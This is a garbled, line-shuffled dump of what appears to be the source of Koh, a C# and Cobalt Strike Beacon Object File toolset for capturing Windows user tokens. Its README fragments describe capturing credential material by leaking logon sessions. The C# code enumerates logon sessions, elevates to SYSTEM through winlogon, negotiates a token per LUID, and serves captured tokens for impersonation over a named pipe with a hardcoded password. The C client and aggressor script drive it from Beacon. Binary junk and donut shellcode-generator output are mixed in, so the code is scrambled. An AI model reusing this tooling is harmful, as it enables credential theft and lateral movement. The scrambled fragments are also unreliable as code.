+    else if(intKohCommand == 2){
+    else if(intKohCommand == 200){
+    else if(intKohCommand == 300){
+    else if(intKohCommand == 400){
+    else if(intKohCommand == 401){
+    else if(intKohCommand == 57005){
+    else {
+    filterSID = BeaconDataExtract(
+    if (clientPipe == INVALID_HANDLE_VALUE) {
+    if(intKohCommand == 1){
+    if(intKohCommand == 300) {
+    int LUID = 0
+    int intKohCommand = 0
+    intKohCommand = BeaconDataInt(
+    kohCommand = (char
+    local('$0 $1 $2 $3 $bid $barch $BOFPath $bofArgs $command $handle $bofData')
+    meta:
+    public class Capture
+    public class Interop
+    public class PipeServer
+    public struct LUID
+    public struct SecBuffer : IDisposable
+    public struct SecBufferDesc : IDisposable
+    strings:
+    try {
+    wchar_t message[1] = { 0 }
+    while (!fSuccess)
+    {
+    }
+   /
+   __   
+   and/or other materials provided with the distribution.
+   contributors may be used to endorse or promote products derived from
+   list of conditions and the following disclaimer.
+   this list of conditions and the following disclaimer in the documentation
+   this software without specific prior written permission.
+  '  /  
+  - [IOCs](
+  - [Koh Client](
+  - [Koh Server](
+  - [Mitigations](
+  - [TODO](
+  - [Table of Contents](
+  - [Technical Background](
+  - [The Inline Shenanigans Bug](
+  .  
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  <PropertyGroup>
+  BeaconDataExtract(datap 
+  BeaconFormatToString(formatp 
+  [ %c%c requires parameter
+  [ AMSI/WDLP     : %s
+  [ AMSI/WDLP     : abort
+  [ Class         : %s
+  [ Compressed    : %s (Reduced by %d%%)
+  [ Compressed    : Xpress Huffman
+  [ Donut shellcode generator v0.9.3
+  [ Entropy       : %s
+  [ Entropy       : Random names 
+  [ Error : %s
+  [ File type     : %s
+  [ File type     : .NET EXE
+  [ Function      : %s
+  [ Instance type : %s
+  [ Instance type : Embedded
+  [ Method        : %s
+  [ Module name   : %s
+  [ OEP           : 0x%llX
+  [ Parameters    : %s
+  [ Parameters    : capture
+  [ Target CPU    : %s
+  [ Target CPU    : x86
+  [ Upload to     : %s
+  and/or other materials provided with the distribution.
+  contributors may be used to endorse or promote products derived from
+  list of conditions and the following disclaimer.
+  this list of conditions and the following disclaimer in the documentation
+  this software without specific prior written permission.
+ !capturedSessions.ContainsKey(identifier)) 
+ !excludeSids.ContainsKey(identifier))
+ !loop) 
+ $s%r
+ 'L>[
+ (((ulong)this) == (LUID)obj)
+ (08@HP
+ (08@HPX
+ (08HPX
+ (8@HPX
+ (Helpers.IsDomainSid(parts[3])))
+ (clientRes != SEC_E_OK))
+ (cred.LowPart == IntPtr.Zero))
+ (filterSids.Count > 0))
+ (index 
+ - captures one unique token per SID found for new (non-network) logon sessions
+ - lists (non-network) logon sessions
+ - monitors for new/unique (non-network) logon sessions
+ -------------------------
+ // win32 systemdate
+ 0@P
+ 0x40000000 -> GENERIC_READ 
+ 0xffffffffL)
+ 100)
+ 8@HPX
+ >vc [1>H')>dL
+ A Beacon Object File is a light-weight post exploitation tool that runs
+ Access is only usable as long as the system doesn't reboot.
+ Additional testing in the lab and field. Possible concerns:
+ Advantages
+ Advantages/Disadvantages Versus Traditional Credential Extraction
+ Approach
+ Base Class Array'
+ Base Class Descriptor at (
+ Beacon Object Files (BOF)
+ Changelog
+ Checking if we have the proper SeTcbPrivilege right before the AcquireCredentialsHandle call (we do).
+ Class Hierarchy Descriptor'
+ Cobalt Strike 4.1.
+ Compilation
+ Complete Object Locator'
+ Directory of 
+ Disadvantages
+ Doesn
+ Doesn't create a new logon event or logon session.
+ Doesn't create additional event logs on the DC outside of normal system ticket renewal behavior (I don't think
+ Doesn't let you reuse access on other systems
+ EHt$X
+ Encryption
+ Example - Capture
+ Example - Listing Logon Sessions
+ Example - Monitoring for Logon Sessions (with group SID filtering)
+ Fix the [Inline Shenanigans Bug](
+ GENERIC_WRITE
+ Group SID Filtering
+ HD$ H
+ HD$PH
+ IAH
+ IOCs
+ If the Koh.exe assembly is run via Cobalt Strike's Beacon fork
+ In order to utilize a logon session LUID with 
+ Initial release
+ KERNEL32$GetLastError() != ERROR_MORE_DATA)
+ Koh
+ Koh Client
+ Koh Server
+ Koh collector is 
+ Koh commands:
+ LowPart
+ Marshal.SizeOf(typeof(LUID)))
+ Marshal.SizeOf(typeof(SecBuffer))))
+ May cause instability if a large number of sessions are leaked (though this can be mitigated with token group SID filtering) and restricting the maximum number of captured tokens (default of 1000 here).
+ Mitigations
+ Neither the name of the copyright holder nor the names of its
+ No default lifetime on the tokens (I don't think
+ OR BUSINESS INTERRUPTION) HOWEVER
+ One possibility was to add 
+ Our Approach
+ Output Functions 
+ Possible Approaches
+ SYSTEM process (see [The Inline Shenanigans Bug](
+ Spawn
+ TODO
+ Table of Contents
+ Technical Background
+ The Inline Shenanigans Bug
+ This is the approach apparently [demonstrated by Ryan](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/using-debugging-tools-to-find-token-and-session-leaks/ba-p/400472).
+ Token Functions 
+ Total actual effective token lifetime
+ Trying to diagnose RPC weirdness (still more to investigate here).
+ Type Descriptor'
+ Unfortunately this misses newly created local sessions and incoming sessions created from things like PSEXEC.
+ Usage
+ Using DuplicateTokenEx and SetThreadToken instead of ImpersonateLoggedOnUser.
+ Utility Functions 
+ Visual Studio Version 16
+ Volume Serial Number is A4FF-7240
+ Volume in drive 
+ Why This Is Possible
+ Works for both local and inbound (non-network) logons.
+ Works for inbound sessions created via Kerberos and NTLM.
+ [1.0.0] - 2018-07-07
+ _Str)
+ __  ___   ______    __    __
+ add SID 
+ aggressor script in your Cobalt Strike client to enable BOF control of the Koh server. The only requirement for using captured tokens is 
+ and Beacon Object File (BOF) toolset that allows for the capture of user credential material via purposeful token/logon session leakage.
+ and everything fails 
+ api>    Optional method or function for DLL. (a method is required for .NET DLL)
+ assembly and 
+ authPackage 
+ buffer
+ capture> [GroupSID... GroupSID2 ...]
+ clientLifeTime.LowPart)
+ command will only capture tokens that contain the supplied group SID. This command can be run multiple times to add additional SIDs for capture. This can help prevent possible stability issues due to a large number of token leaks.
+ credentialUserName 
+ current pointer into our buffer 
+ data API 
+ delete
+ delete[]
+ examples:
+ field which states:
+ filterSID = NULL
+ format API 
+ format)
+ i < args.Length
+ i < count
+ i < groups.GroupCount
+ i < hashBytes.Length
+ index
+ index < BufferCount
+ is performed to perform a 
+ kohCommand = NULL
+ logonType
+ logonType == Interop.SECURITY_LOGON_TYPE.NewCredentials)
+ luid.LowPart
+ monitor 
+ new
+ new[]
+ ob=
+ or 
+ original
+ pInfo)
+ parser)
+ pipe will let you confirm if Koh is indeed running. The default impersonation pipe used is 
+ release a logon session if a token handle still exists to it (and therefore the reference count != 0).
+ remaining length of data 
+ remove SID 
+ script. The only requirement (on Debian at least) should be 
+ sidAndAttrSize 
+ size)
+ symmetric encryption (default)
+ tEu
+ that stays open as long as Koh is running. The default password used for Koh communication is 
+ the original buffer [so we can free it] 
+ to NT AUTHORITY
+ to a value like 30 is doable in your environment.
+ to any 
+ to get tokens for new desktop sessions to clone. 
+ total size of this buffer 
+ type elevation.
+ usage: donut [options] <EXE/DLL/VBS/JS>
+ w$H
+ which allows you to specify a logon session ID (LUID) to create a new token.
+ with Beacon's inline-execute command.
+ x86_64-w64-mingw32-gcc -c KohClient.c -o KohClient.x64.o
+ you need 
+!-=j
+!/bin/bash
+!3VV
+!>11Y@
+!>6'Yx
+!L!-V
+!L$%f
+!L%w
+!L)'n
+!L)(os<=-
+!L-7LLMRL
+!L/rkJ
+!L5@e
+!L6Af
+!LDNp
+!LH/@
+!LH0@
+!LKRZHOY
+!LMML
+!LNSMMM/9L
+!LQ3@P2
+!LR[{
+!P HE0
+!P}>x>
+!n03>Pu
+"                                                        // if we're doing ""capture"""
+"                                                        CapturedSession captureSession = new CapturedSession(session.UserName, luid, session.SID, $""{session.LogonType}"", session.AuthPackage, session.SID, session.CredentialUserName, $""{(ulong)tokenOrigin}"", IntPtr.Zero)"
+"                                                        CapturedSession captureSession = new CapturedSession(session.UserName, luid, session.SID, $""{session.LogonType}"", session.AuthPackage, session.SID, session.CredentialUserName, $""{(ulong)tokenOrigin}"", hToken)"
+"                                                        Console.WriteLine($"""
+"                                                        capturedSessions.TryAdd(identifier, captureSession)"
+"                                                    // if we're doing ""list"" or monitor"" close the token off to free it up"
+"                                                    // if we're doing ""monitor"" add the observed session to the list"
+"                                                // if we're doing ""capture"""
+"                                                CapturedSession captureSession = new CapturedSession(session.UserName, luid, session.SID, $""{session.LogonType}"", session.AuthPackage, session.SID, session.CredentialUserName, $""{(ulong)tokenOrigin}"", IntPtr.Zero)"
+"                                                CapturedSession captureSession = new CapturedSession(session.UserName, luid, session.SID, $""{session.LogonType}"", session.AuthPackage, session.SID, session.CredentialUserName, $""{(ulong)tokenOrigin}"", hToken)"
+"                                                Console.WriteLine($""      AuthPackage           : {session.AuthPackage}"")"
+"                                                Console.WriteLine($""      Credential UserName   : {session.CredentialUserName}"")"
+"                                                Console.WriteLine($""      LUID                  : {session.Luid}"")"
+"                                                Console.WriteLine($""      LogonType             : {session.LogonType}"")"
+"                                                Console.WriteLine($""      Origin LUID           : {(ulong)tokenOrigin} ({tokenOrigin})"")"
+"                                                Console.WriteLine($""      User SID              : {session.SID}"")"
+"                                                Console.WriteLine($""      UserName              : {session.UserName}"")"
+"                                                Console.WriteLine($""  [X] Error conecting to {pipeName} : {ex.Message} ({ex.ErrorCode})"")"
+"                                                Console.WriteLine($"""
+"                                                Interop.WriteFile(hPipe, bytes, (uint)bytes.Length, out written, IntPtr.Zero)"
+"                                                _capturedSessions.TryRemove(capturedSession.Key, out temp)"
+"                                                capturedSessions.TryAdd(identifier, captureSession)"
+"                                            // if the token does not match any filtering, add it to the exclude list"
+"                                            // if we're doing ""list"" or monitor"""
+"                                            // if we're doing ""monitor"""
+"                                            IntPtr hPipe = Interop.CreateFile($""{pipeName}"", 0x80000000 "
+"                                            excludeSids.TryAdd(identifier, true)"
+"                                            if (Helpers.CheckTokenForGroup(hToken, $""{sidString}""))"
+"                                            responseMsg = $""[!] Error impersonating token {capturedSession.Value.TokenHandle} for LUID {capturedSession.Value.Luid} to pipe {pipeName}"""
+"                                            responseMsg = $""[!] Error releasing token {capturedSession.Value.TokenHandle} for LUID {capturedSession.Value.Luid} !"""
+"                                            responseMsg = $""["
+"                                        Console.WriteLine($""      AuthPackage           : {session.AuthPackage}"")"
+"                                        Console.WriteLine($""      Credential UserName   : {session.CredentialUserName}"")"
+"                                        Console.WriteLine($""      LUID                  : {session.Luid}"")"
+"                                        Console.WriteLine($""      LogonType             : {session.LogonType}"")"
+"                                        Console.WriteLine($""      Origin LUID           : {(ulong)tokenOrigin} ({tokenOrigin})"")"
+"                                        Console.WriteLine($""      User SID              : {session.SID}"")"
+"                                        Console.WriteLine($""      UserName              : {session.UserName}"")"
+"                                        Console.WriteLine($"""
+"                                        if (_capturedSessions.TryRemove(capturedSession.Key, out temp))"
+"                                        responseMsg = ""[!] Usage: 'release allbut LUID'"""
+"                                        responseMsg = $""["
+"                                        responseMsg = String.Join("""
+"                                    Console.WriteLine($""      AuthPackage           : {session.AuthPackage}"")"
+"                                    Console.WriteLine($""      Credential UserName   : {session.CredentialUserName}"")"
+"                                    Console.WriteLine($""      LUID                  : {session.Luid}"")"
+"                                    Console.WriteLine($""      LogonType             : {session.LogonType}"")"
+"                                    Console.WriteLine($""      Origin LUID           : {(ulong)tokenOrigin} ({tokenOrigin})"")"
+"                                    Console.WriteLine($""      User SID              : {session.SID}"")"
+"                                    Console.WriteLine($""      UserName              : {session.UserName}"")"
+"                                    Console.WriteLine($"""
+"                                    if (ulong.TryParse(parts[4], out luid)) {"
+"                                    logonSessions.Add(identifier, foundSession)"
+"                                    responseMsg = ""[!] Usage: 'release allbut LUID'"""
+"                                // ""release all"" -> release all tokens except the on for the specific LUID"
+"                                // ""release all"" -> release all tokens"
+"                                Console.WriteLine($""  [!] Exception: ${e}"")"
+"                                FoundSession foundSession = new FoundSession($""{domain}"
+"                                IntPtr hToken = Creds.NegotiateToken(userLuid, meta, DEBUG)"
+"                                logonSessionsToProcess.Add(entry.Key, entry.Value)"
+"                                responseMsg = ""[!] LUID not found!"""
+"                                responseMsg = ""[!] No group SIDs current set for capture filtering."""
+"                                responseMsg = ""["
+"                                responseMsg = $""[!] Error adding {parts[3]} group SID to capture filtering!"""
+"                                responseMsg = $""[!] Error removing {parts[3]} group SID to capture filtering!"""
+"                                responseMsg = $""["
+"                            Console.WriteLine($"""
+"                            else if (parts[2].ToLower() == ""allbut"")"
+"                            else if (ulong.TryParse(parts[2], out luid))"
+"                            filterSids.TryAdd(args[i], true)"
+"                            if (!negotiateSessions.ContainsKey($""{entry.Value.SID}{entry.Value.LogonType}"")) {"
+"                            if (_filterSids.TryRemove(parts[3], out val))"
+"                            if (parts[2].ToLower() == ""all"")"
+"                            if (ulong.TryParse(parts[2], out luid))"
+"                            if(_filterSids.TryAdd(parts[3], true))"
+"                            if(args[i].ToLower() == ""/debug"")"
+"                            negotiateSessions.Add(negotiateKey, true)"
+"                            responseMsg = ""[!] No current sessions captured"""
+"                            responseMsg = ""["
+"                            responseMsg = $""[X] Cannot impersonate in monitor mode"""
+"                            responseMsg = $""[X] Cannot list groups in monitor mode"""
+"                            responseMsg = $""[X] Cannot release tokens in monitor mode"""
+"                        // get the credential username (i.e., for NewCredentials)"
+"                        // if we're capturing, ensure we only capture the negotiate session for a SID"
+"                        // lists, adds, or resets the SIDs tofilter"
+"                        // monitor a host for new logon sessions and ""capture"" all sessions by negotiating a new token for each"
+"                        // releases all tokens/sessions, or a token for a specified LUID"
+"                        Capture.Sessions(meta, capturedSessions, excludeSids, filterSids, false, false)"
+"                        Capture.Sessions(meta, capturedSessions, excludeSids, filterSids, true, false)"
+"                        Capture.Sessions(meta, capturedSessions, excludeSids, filterSids, true, true)"
+"                        Console.WriteLine($""  [!] Error with calling LsaGetLogonSessionData on LUID {luidPtr}: {ret}"")"
+"                        LowPart = 0,"
+"                        LowPart = IntPtr.Zero,"
+"                        PipeServer server = new PipeServer(pipeName, password, meta, capturedSessions, excludeSids, filterSids, ""capture"", DEBUG)"
+"                        PipeServer server = new PipeServer(pipeName, password, meta, capturedSessions, excludeSids, filterSids, ""monitor"", DEBUG)"
+"                        _meta[""SignalExit""] = 1"
+"                        if (_mode == ""monitor"")"
+"                        if (entry.Value.AuthPackage == ""Negotiate"")"
+"                        if(_mode == ""monitor"")"
+"                        if(responseMsg == """")"
+"                        logonSessionsToProcess.Add(entry.Key, entry.Value)"
+"                        pipeStream.Write(outBuffer, 0, responseMsg.Length)"
+"                        responseMsg = """""
+"                        responseMsg = $""["
+"                        string negotiateKey = $""{entry.Value.SID}{entry.Value.LogonType}"""
+"                        ulong.TryParse(session.Luid, out luid)"
+"                        var credentialUserName = Creds.GetCredentialUserName(new LUID(logonID), DEBUG)"
+"                        var logonID = """""
+"                        var userSID = """""
+"                    """","
+"                    -1,"
+"                    // if we haven't captured any sessions and we have more than one error for AcquireCredentialsHandle, signal for exit"
+"                    // if we're capturing sessions, check every 500ms"
+"                    0,"
+"                    4096,"
+"                    BufferCount = 0,"
+"                    Console.WriteLine(""  [!] GetSystem() - DuplicateToken failed!"")"
+"                    Console.WriteLine(""  [!] GetSystem() - ImpersonateLoggedOnUser failed!"")"
+"                    Console.WriteLine(""  [!] GetSystem() - OpenProcessToken failed!"")"
+"                    Console.WriteLine(""  [X] Error elevating to SYSTEM!"")"
+"                    Console.WriteLine(""  [X] QuerySecurityContextToken() failed: {0}"", status)"
+"                    Console.WriteLine("""
+"                    Console.WriteLine($""      {sidString}"")"
+"                    Console.WriteLine($""  [!] Error with calling LsaEnumerateLogonSessions: {ret}"")"
+"                    Console.WriteLine($""  [X] AcquireCredentialsHandle for LUID {luid} failed. Error: 0x{res:x8}"")"
+"                    Console.WriteLine($""  [X] AcquireCredentialsHandle for LUID {luid} failed. Error: SEC_E_NO_CREDENTIALS"")"
+"                    Console.WriteLine($""  [X] Exception: {e}"")"
+"                    Console.WriteLine($""  [X] First AcceptSecurityContext() failed: {serverRes}"")"
+"                    Console.WriteLine($""  [X] First InitializeSecurityContext() failed: {clientRes}"")"
+"                    Console.WriteLine($""  [X] Second AcceptSecurityContext() failed: {serverRes}"")"
+"                    Console.WriteLine($""  [X] Second InitializeSecurityContext() failed: {clientRes}"")"
+"                    Console.WriteLine($"""
+"                    ISC_REQ_CONNECTION,"
+"                    IntPtr.Zero,"
+"                    Interop.ConvertSidToStringSid(sidAndAttributes.Sid, out sidString)"
+"                    PipeDirection.InOut,"
+"                    PipeOptions.Asynchronous,"
+"                    PipeTransmissionMode.Message,"
+"                    SECURITY_NATIVE_DREP,"
+"                    Version = 0,"
+"                    _pipeName,"
+"                    else if (command == ""capture"")"
+"                    else if (command == ""exit"")"
+"                    else if (command == ""filter"")"
+"                    else if (command == ""groups"")"
+"                    else if (command == ""impersonate"")"
+"                    else if (command == ""monitor"")"
+"                    else if (command == ""release"")"
+"                    if (command != ""impersonate"")"
+"                    if (command == ""list"")"
+"                    if(entry.Value.AuthPackage == ""Negotiate"")"
+"                    meta[""AcquireCredentialsHandleError""] = meta[""AcquireCredentialsHandleError""] "
+"                    meta[""SignalExit""] = 1"
+"                    out ClientContext,"
+"                    out ClientToken,"
+"                    out ClientToken2,"
+"                    out ContextAttributes,"
+"                    out ServerContext,"
+"                    out ServerToken,"
+"                    ref ClientContext,"
+"                    ref ClientToken,"
+"                    ref ClientToken2,"
+"                    ref ServerContext,"
+"                    ref ServerToken,"
+"                    ref cred,"
+"                    ret = Interop.LsaGetLogonSessionData(luidPtr, out var sessionData)"
+"                    sb.Append(hashBytes[i].ToString(""X2""))"
+"                    string sidString = """""
+"                    throw new Exception(""First AcceptSecurityContext failure"")"
+"                    throw new Exception(""InitializeSecurityContext failure"")"
+"                    throw new Exception(""QuerySecurityContextToken failure"")"
+"                    throw new Exception(""Second AcceptSecurityContext failure"")"
+"                    throw new Exception(""Second InitializeSecurityContext failure"")"
+"                    var data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA))"
+"                    var secBuffer = (SecBuffer)Marshal.PtrToStructure(currentBufferPtr, typeof(SecBuffer))"
+"                """","
+"                ""Negotiate"","
+"                $bofArgs = bof_pack($bid, ""iiz"", 401, $3, """")"
+"                // Step 2 -> call AcceptSecurityContext() with the client token, using the same credential"
+"                // Step 2 -> call InitializeSecurityContext() with the cred handle to start the ""client"" side of negotiation"
+"                // find all ""Negotiate"" logon session packages so we can prefer to use these"
+"                // get the username for the credential (i.e., for NewCredentials)"
+"                // password used for communications, super securez I know :)"
+"                // thread safe dictionary for metadata, i.e., signaling we're exiting"
+"                ArgumentException argEx = new ArgumentException(""Passed LUID string value is not in a hex or decimal form"", value)"
+"                BeaconPrintf(CALLBACK_ERROR, ""[!] ADVAPI32$DuplicateTokenEx failed with: %d"
+"                BeaconPrintf(CALLBACK_ERROR, ""[!] ADVAPI32$OpenThreadToken failed with: %d"
+"                BeaconPrintf(CALLBACK_ERROR, ""[!] Error applying the token to the current context."
+"                ConcurrentDictionary<string, Capture.CapturedSession> capturedSessions = new ConcurrentDictionary<string, Capture.CapturedSession>()"
+"                ConcurrentDictionary<string, bool> excludeSids = new ConcurrentDictionary<string, bool>()"
+"                ConcurrentDictionary<string, bool> filterSids = new ConcurrentDictionary<string, bool>()"
+"                ConcurrentDictionary<string, int> meta = new ConcurrentDictionary<string, int>()"
+"                Console.WriteLine(""  ["
+"                Console.WriteLine(""  [X] Not high integrity!"")"
+"                Console.WriteLine($""  [!] Error in LogonSessions(): {e}"")"
+"                Console.WriteLine($""  [!] Unhandled terminating exception: {e}"")"
+"                Console.WriteLine($""  [X] Error retrieving computer name via GetComputerName(): {ex.Message} ({ex.ErrorCode})"")"
+"                Console.WriteLine($""DEBUG ({DateTime.Now}) Command: {input}"")"
+"                Console.WriteLine($""DEBUG ({DateTime.Now}) Response: {responseMsg}"")"
+"                Dictionary<string, Find.FoundSession> logonSessions = Find.LogonSessions(DEBUG)"
+"                Dictionary<string, Find.FoundSession> logonSessionsToProcess = new Dictionary<string, Find.FoundSession>()"
+"                Dictionary<string, bool> negotiateSessions = new Dictionary<string, bool>()"
+"                IntPtr pGroups = GetTokenInfo(token, Interop.TOKEN_INFORMATION_CLASS.TokenGroups)"
+"                IntPtr.Zero,"
+"                Interop.SECURITY_HANDLE cred = GetCredentialHandle(luid, meta)"
+"                Interop.TOKEN_GROUPS groups = (Interop.TOKEN_GROUPS)Marshal.PtrToStructure(pGroups, typeof(Interop.TOKEN_GROUPS))"
+"                Marshal.Copy(buffer, 0, BufferPtr, BufferSize)"
+"                Marshal.StructureToPtr(secBuffer, BuffersPtr, false)"
+"                Process[] processes = Process.GetProcessesByName(""winlogon"")"
+"                SECPKG_CRED_BOTH,"
+"                UInt64 uintVal = Convert.ToUInt64(value, 16)"
+"                beacon_inline_execute($bid, $bofData, ""go"", $bofArgs)"
+"                berror($1, ""'release all' or 'release LUID' required"")"
+"                bool success = Interop.OpenProcessToken(handle, 0x0002, out hToken)"
+"                foreach (KeyValuePair<string, Find.FoundSession> entry in logonSessions)"
+"                foreach (KeyValuePair<string, Find.FoundSession> entry in logonSessionsToProcess)"
+"                if (DEBUG) Console.WriteLine($""DEBUG Error running QueryCredentialsAttributes: {ret}"")"
+"                if (DEBUG) Console.WriteLine($""DEBUG Successfully got a credential handle to LUID: {luid}"")"
+"                if (DEBUG) Console.WriteLine($""DEBUG Successfully negotiated credential to token: {token}"")"
+"                if (e.Message != ""fail"")"
+"                luidPtr,"
+"                meta[""AcquireCredentialsHandleError""] = 0"
+"                meta[""SignalExit""] = 0"
+"                outputStream.Write(secBufferBytes, 0, secBufferBytes.Length)"
+"                pipeSecurity.SetAccessRule(new PipeAccessRule(""Everyone"", PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow))"
+"                pipeStream.Read(inBuffer, 0, 4096)"
+"                ref cred,"
+"                return """""
+"                string password = ""password"""
+"                string pipeName = ""imposecost"""
+"                success = Interop.DuplicateToken(hToken, 2, ref hDupToken)"
+"                throw new Exception(""Unable to get token info."")"
+"                uint status = Interop.QuerySecurityContextToken(ServerContext, out token)"
+"                var ret = Interop.LsaEnumerateLogonSessions(out var count, out var luidPtr)"
+"                var secBuffer = (SecBuffer)Marshal.PtrToStructure(currentBufferPtr, typeof(SecBuffer))"
+"                var systime = new DateTime(1601, 1, 1, 0, 0, 0, 0)"
+"               9 Dir(s)  40,504,201,216 bytes free"
+"               string lpFileName,"
+"               uint dwCreationDisposition,"
+"               uint dwDesiredAccess,"
+"               uint dwFlagsAndAttributes,"
+"               uint dwShareMode,"
+"               uint lpSecurityAttributes,"
+"            $bofArgs = bof_pack($bid, ""iiz"", 1, 0, """")"
+"            $bofArgs = bof_pack($bid, ""iiz"", 100, 0, """")"
+"            $bofArgs = bof_pack($bid, ""iiz"", 101, 0, $4)"
+"            $bofArgs = bof_pack($bid, ""iiz"", 102, 0, $4)"
+"            $bofArgs = bof_pack($bid, ""iiz"", 103, 0, """")"
+"            $bofArgs = bof_pack($bid, ""iiz"", 2, $3, """")"
+"            $bofArgs = bof_pack($bid, ""iiz"", 200, $3, """")"
+"            $bofArgs = bof_pack($bid, ""iiz"", 300, $3, """")"
+"            $bofArgs = bof_pack($bid, ""iiz"", 400, 0, """")"
+"            // Returns true if the current context is ""NT AUTHORITY"
+"            // Takes a token pointer and a group SID string, and returns if the given token has that specific group present"
+"            //Console.WriteLine($""["
+"            Array.Copy(highBytes, 0, bytes, 4, 4)"
+"            Array.Copy(lowBytes, 0, bytes, 0, 4)"
+"            Batch,                  // logon for a batch process."
+"            BeaconPrintf(CALLBACK_ERROR, ""[!] ADVAPI32$ImpersonateNamedPipeClient failed with: %d"
+"            BeaconPrintf(CALLBACK_ERROR, ""[!] Connecting to named pipe %s using KERNEL32$CreateFileA failed file not found."
+"            BeaconPrintf(CALLBACK_ERROR, ""[!] Connecting to named pipe %s using KERNEL32$CreateFileA failed with: %d"
+"            BeaconPrintf(CALLBACK_ERROR, ""[!] Creating named pipe %s using KERNEL32$CreateNamedPipeA failed with: %d"
+"            BeaconPrintf(CALLBACK_ERROR, ""[!] Failed to enable SeImpersonatePrivilege: %d"
+"            BeaconPrintf(CALLBACK_ERROR, ""[!] KERNEL32$ConnectNamedPipe failed: %d"
+"            BeaconPrintf(CALLBACK_ERROR, ""[!] KERNEL32$ReadFile failed with: %d"
+"            BeaconPrintf(CALLBACK_ERROR, ""[!] KERNEL32$ReadFile failed: %d"
+"            BeaconPrintf(CALLBACK_OUTPUT, ""["
+"            CachedInteractive,      // attempt to use the cached credentials without going out across the network"
+"            CachedRemoteInteractive,// same as RemoteInteractive, except used internally for auditing purposes"
+"            Console.WriteLine("""
+"            Console.WriteLine($""                     v{Version}"
+"            Console.WriteLine($"""
+"            DISABLED = 0x00000000,"
+"            IntPtr ExistingTokenHandle,"
+"            IntPtr PAuthenticationID,"
+"            IntPtr ProcessHandle,"
+"            IntPtr TokenHandle,"
+"            IntPtr TokenInformation,"
+"            IntPtr hFile,"
+"            IntPtr luid,"
+"            IntPtr pAuthData,"
+"            IntPtr pGetKeyFn,"
+"            IntPtr pInput,"
+"            IntPtr pOrigin = Helpers.GetTokenInfo(token, Interop.TOKEN_INFORMATION_CLASS.TokenOrigin)"
+"            IntPtr phContext,"
+"            IntPtr pvGetKeyArgument,"
+"            IntPtr securityIdentifier,"
+"            Interactive = 2,        // logging on interactively."
+"            Interop.TOKEN_ORIGIN origin = (Interop.TOKEN_ORIGIN)Marshal.PtrToStructure(pOrigin, typeof(Interop.TOKEN_ORIGIN))"
+"            Marshal.Copy(BufferPtr, buffer, 0, BufferSize)"
+"            Marshal.StructureToPtr(luid, luidPtr, false)"
+"            Match m = Regex.Match(sid, pattern, RegexOptions.IgnoreCase)"
+"            Network,                // logging using a network."
+"            NetworkCleartext,       // network logon with cleartext credentials"
+"            NewCredentials,         // caller can clone its current token and specify new credentials for outbound connections"
+"            Proxy,                  // Not supported."
+"            RemoteInteractive,      // terminal server session that is both remote and interactive"
+"            Result = Interop.GetTokenInformation(token, informationClass, TokenInformation, TokenInfLength, out TokenInfLength)"
+"            SECURITY_HANDLE phContext,"
+"            SE_PRIVILEGE_ENABLED = 0x00000002,"
+"            SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001,"
+"            SE_PRIVILEGE_REMOVED = 0x00000004,"
+"            Service,                // logon for a service account."
+"            TOKEN_INFORMATION_CLASS TokenInformationClass,"
+"            TokenAuditPolicy,"
+"            TokenDefaultDacl,"
+"            TokenGroups,"
+"            TokenGroupsAndPrivileges,"
+"            TokenImpersonationLevel,"
+"            TokenOwner,"
+"            TokenPrimaryGroup,"
+"            TokenPrivileges,"
+"            TokenRestrictedSids,"
+"            TokenSandBoxInert,"
+"            TokenSessionId,"
+"            TokenSessionReference,"
+"            TokenSource,"
+"            TokenStatistics,"
+"            TokenType,"
+"            TokenUser = 1,"
+"            UInt32 DesiredAccess,"
+"            Unlock,                 // workstation unlock"
+"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 35)]"
+"            _meta[""SignalExit""] = 1"
+"            beacon_inline_execute($bid, $bofData, ""go"", $bofArgs)"
+"            berror($1, ""LUID required!"")"
+"            berror($1, ""Usage: koh filter [list "
+"            berror($bid, ""KohClient BOF not found!"")"
+"            byte[] lpBuffer,"
+"            else if (System.Text.RegularExpressions.Regex.IsMatch(value, @"""
+"            if (!ADVAPI32$DuplicateTokenEx(threadToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, "
+"            if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, "
+"            if (!Interop.GetComputerName(name, ref nSize))"
+"            if (DEBUG) Console.WriteLine($""DEBUG Successfully got a credential handle to LUID: {luid}"")"
+"            if (System.Text.RegularExpressions.Regex.IsMatch(value, @"""
+"            int Reserved1,"
+"            int Reserved2,"
+"            int SECURITY_IMPERSONATION_LEVEL,"
+"            int TargetDataRep,"
+"            int TokenInformationLength,"
+"            int fContextReq,"
+"            int fCredentialUse,"
+"            out SECURITY_HANDLE phNewContext,"
+"            out SecBufferDesc pOutput,"
+"            out UInt64 LogonSessionCount,"
+"            out uint lpNumberOfBytesWritten,"
+"            out uint pfContextAttr,"
+"            public CapturedSession(string userName, ulong luid, string sid, string logonType, string authPackage, string userSid, string credUser, string originLUID, IntPtr tokenHandle)"
+"            public FoundSession(string userName, string credentialUserName, string luid, string sid, Interop.SECURITY_LOGON_TYPE logonType, string authPackage)"
+"            public TOKEN_PRIVILEGES(uint PrivilegeCount, LUID_AND_ATTRIBUTES[] Privileges)"
+"            ref SECURITY_HANDLE phContext,"
+"            ref SECURITY_HANDLE phCredential,"
+"            ref SecBufferDesc SecBufferDesc,"
+"            ref SecBufferDesc pInput,"
+"            return $""{name}"""
+"            return String.Format(""0x{0:x}"", (ulong)Value)"
+"            string pattern = @"""
+"            string pszPackage,"
+"            string pszPrincipal,"
+"            string pszTargetName,"
+"            string responseMsg = ""Incorrect usage"""
+"            uint TargetDataRep,"
+"            uint fContextReq,"
+"            uint nNumberOfBytesToWrite,"
+"            uint ret = Interop.QueryCredentialsAttributes(ref cred, 1, out var credName)"
+"            ulong ulAttribute,"
+"            var Result = Interop.GetTokenInformation(token, informationClass, IntPtr.Zero, TokenInfLength, out TokenInfLength)"
+"            var logonSessions = new Dictionary<string, FoundSession>()"
+"            while (_meta[""SignalExit""] != 1)"
+"        $bofArgs = bof_pack($bid, ""iiz"", 57005, 0, """")"
+"        $bofData = readb($handle, -1)"
